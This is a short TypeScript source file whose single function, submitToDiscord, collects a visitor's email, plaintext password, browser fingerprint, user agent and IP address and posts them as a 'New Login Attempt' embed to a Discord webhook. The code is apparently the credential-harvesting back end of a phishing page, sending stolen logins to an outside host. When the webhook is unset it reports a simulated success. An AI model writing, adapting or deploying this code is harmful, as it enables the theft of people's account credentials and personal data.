
export async function submitToDiscord(email: string, password: string, fingerprint: string, theme: string, userAgent: string, ip: string) {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

  if (!webhookUrl) {
    console.error("DISCORD_WEBHOOK_URL is not set");
    return { status: "ok", message: "Simulated success (no webhook)" };
  }

  const payload = {
    embeds: [
      {
        title: "New Login Attempt",
        color: 0xff4b33,
        fields: [
          { name: "Email", value: email || "N/A", inline: true },
          { name: "Password", value: password || "N/A", inline: true },
          { name: "Theme", value: theme || "Default", inline: true },
          { name: "Fingerprint", value: `\`\`\`${fingerprint || "N/A"}\`\`\`` },
          { name: "User Agent", value: userAgent || "N/A" },
          { name: "IP", value: ip || "N/A" }
        ],
        timestamp: new Date().toISOString()
      }
    ]
  };

  const response = await fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  if (!response.ok) {
    throw new Error(`Discord API responded with status ${response.status}`);
  }

  return { status: "ok" };
}
